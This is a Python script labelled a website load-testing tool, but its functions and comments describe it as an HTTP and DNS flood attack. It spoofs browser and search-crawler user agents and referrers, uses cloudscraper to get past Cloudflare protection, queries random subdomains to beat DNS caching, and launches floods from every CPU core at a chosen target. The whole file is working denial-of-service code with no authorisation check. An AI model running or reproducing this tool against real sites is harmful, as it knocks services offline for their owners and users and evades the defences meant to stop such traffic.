import cloudscraper
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import sys
import socket
import dns.resolver
import asyncio
import aiohttp
from functools import partial
import multiprocessing
import os

# Enhanced list of 50 user agents with mobile, desktop, and bot variants
USER_AGENTS = [
    # Chrome variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    
    # Firefox variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    
    # Safari variants
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    
    # Edge variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    
    # Additional mobile variants
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    
    # Additional desktop variants
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 15117.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    # Bot/crawler variants
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Twitterbot/1.0",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    
    # 25 more randomized variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod touch; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel Fold) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G715FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-F711B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-M336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-X700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-X800) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

# Common referrers
REFERRERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://www.instagram.com/",
    "https://www.pinterest.com/",
    "https://www.tumblr.com/",
    "https://www.wikipedia.org/",
    "https://www.amazon.com/",
    "https://www.ebay.com/",
    "https://www.youtube.com/",
    "https://www.twitch.tv/"
]

# Common accept languages
ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "fr-FR,fr;q=0.9",
    "de-DE,de;q=0.9",
    "es-ES,es;q=0.9",
    "it-IT,it;q=0.9",
    "pt-BR,pt;q=0.9",
    "ru-RU,ru;q=0.9",
    "ja-JP,ja;q=0.9",
    "zh-CN,zh;q=0.9"
]

# DNS resolver list
DNS_RESOLVERS = [
    "8.8.8.8",        # Google
    "8.8.4.4",        # Google
    "1.1.1.1",        # Cloudflare
    "1.0.0.1",        # Cloudflare
    "9.9.9.9",        # Quad9
    "149.112.112.112", # Quad9
    "208.67.222.222", # OpenDNS
    "208.67.220.220", # OpenDNS
    "64.6.64.6",      # Verisign
    "64.6.65.6"       # Verisign
]

def get_random_headers():
    """Generate random headers for each request"""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive' if random.random() > 0.3 else 'close',
        'Referer': random.choice(REFERRERS),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin' if random.random() > 0.7 else 'cross-site',
        'Sec-Fetch-User': '?1' if random.random() > 0.5 else None,
        'TE': 'trailers'
    }

async def async_http_flood(target_url, session, request_counter, success_counter, error_counter, use_cloudscraper):
    """Asynchronous HTTP flood attack with alternating GET/POST"""
    try:
        headers = get_random_headers()
        
        # Alternate between GET and POST
        if request_counter.value % 2 == 0:
            # GET request
            if use_cloudscraper:
                async with session.get(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    pass
            else:
                async with session.get(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    pass
        else:
            # POST request with random data
            data = {'random': str(random.randint(0, 1000000))}
            if use_cloudscraper:
                async with session.post(target_url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    pass
            else:
                async with session.post(target_url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    pass
        
        with request_counter.get_lock():
            request_counter.value += 1
        with success_counter.get_lock():
            success_counter.value += 1
        
    except Exception as e:
        with request_counter.get_lock():
            request_counter.value += 1
        with error_counter.get_lock():
            error_counter.value += 1

async def run_async_http_flood(target_url, duration, workers, use_cloudscraper, request_counter, success_counter, error_counter):
    """Run async HTTP flood with specified parameters"""
    end_time = time.time() + duration
    connector = aiohttp.TCPConnector(limit=0, force_close=True, enable_cleanup_closed=True)
    
    if use_cloudscraper:
        scraper = cloudscraper.create_scraper()
        session = scraper
    else:
        session = aiohttp.ClientSession(connector=connector)
    
    tasks = []
    while time.time() < end_time:
        for _ in range(workers):
            task = asyncio.create_task(
                async_http_flood(target_url, session, request_counter, success_counter, error_counter, use_cloudscraper)
            )
            tasks.append(task)
        
        # Small delay to prevent immediate overloading
        await asyncio.sleep(0.01)
    
    await asyncio.gather(*tasks)
    
    if not use_cloudscraper:
        await session.close()

def dns_flood(target_domain, duration, request_counter, success_counter, error_counter):
    """Perform DNS flood attack"""
    end_time = time.time() + duration
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [random.choice(DNS_RESOLVERS)]
    
    while time.time() < end_time:
        try:
            # Random subdomain to bypass caching
            subdomain = f"{random.randint(0, 1000000)}.{target_domain}"
            resolver.resolve(subdomain, 'A')
            
            with request_counter.get_lock():
                request_counter.value += 1
            with success_counter.get_lock():
                success_counter.value += 1
            
            # Small delay to prevent complete system lock
            time.sleep(0.01)
            
        except Exception as e:
            with request_counter.get_lock():
                request_counter.value += 1
            with error_counter.get_lock():
                error_counter.value += 1

def print_stats(start_time, request_counter, success_counter, error_counter):
    """Print current statistics"""
    elapsed = time.time() - start_time
    rps = request_counter.value / elapsed if elapsed > 0 else 0
    
    print(f"\rRequests: {request_counter.value} | "
          f"Success: {success_counter.value} | "
          f"Errors: {error_counter.value} | "
          f"RPS: {rps:.2f} | "
          f"Elapsed: {elapsed:.2f}s", end="", flush=True)

def main():
    parser = argparse.ArgumentParser(description='Advanced Website Load Testing Tool')
    parser.add_argument('target', help='Target URL or domain to test')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Test duration in seconds (default: 60)')
    parser.add_argument('-w', '--workers', type=int, default=100, help='Number of concurrent workers (default: 100)')
    parser.add_argument('-c', '--cloudscraper', action='store_true', help='Use cloudscraper to bypass Cloudflare')
    parser.add_argument('--dns', action='store_true', help='Enable DNS flood attack')
    parser.add_argument('--http', action='store_true', help='Enable HTTP flood attack (default if no attack specified)')
    
    args = parser.parse_args()
    
    if not args.dns and not args.http:
        args.http = True  # Default to HTTP flood if no attack specified
    
    if args.http and not args.target.startswith(('http://', 'https://')):
        print("Error: Target must start with http:// or https:// for HTTP flood")
        sys.exit(1)
    
    if args.dns and ('http://' in args.target or 'https://' in args.target):
        args.target = args.target.split('://')[1].split('/')[0]
    
    print(f"Starting test with {args.workers} workers for {args.duration} seconds")
    if args.cloudscraper and args.http:
        print("Using cloudscraper to bypass Cloudflare protections")
    if args.http:
        print(f"HTTP flood target: {args.target}")
    if args.dns:
        print(f"DNS flood target: {args.target}")
    
    # Shared counters for all processes
    manager = multiprocessing.Manager()
    request_counter = manager.Value('i', 0)
    success_counter = manager.Value('i', 0)
    error_counter = manager.Value('i', 0)
    
    start_time = time.time()
    
    # Create and start processes
    processes = []
    
    if args.http:
        # Start HTTP flood in a separate process
        for _ in range(multiprocessing.cpu_count()):
            p = multiprocessing.Process(
                target=lambda: asyncio.run(
                    run_async_http_flood(
                        args.target, args.duration, args.workers, 
                        args.cloudscraper, request_counter, 
                        success_counter, error_counter
                    )
                )
            )
            p.start()
            processes.append(p)
    
    if args.dns:
        # Start DNS flood in a separate process
        for _ in range(multiprocessing.cpu_count()):
            p = multiprocessing.Process(
                target=dns_flood,
                args=(args.target, args.duration, request_counter, success_counter, error_counter)
            )
            p.start()
            processes.append(p)
    
    # Print stats while attacks are running
    try:
        while any(p.is_alive() for p in processes):
            print_stats(start_time, request_counter, success_counter, error_counter)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nCaught keyboard interrupt, stopping attacks...")
        for p in processes:
            p.terminate()
    
    # Wait for processes to finish
    for p in processes:
        p.join()
    
    # Final stats
    elapsed = time.time() - start_time
    print("\n\nTest completed!")
    print(f"Actual duration: {elapsed:.2f} seconds")
    print(f"Total requests: {request_counter.value}")
    print(f"Successful responses: {success_counter.value}")
    print(f"Errors: {error_counter.value}")
    print(f"Requests per second: {request_counter.value/elapsed:.2f}")

if __name__ == "__main__":
    # Increase ulimit if possible
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
    except:
        pass
    
    # Set high priority if possible
    try:
        os.nice(-20)
    except:
        pass
    
    main()
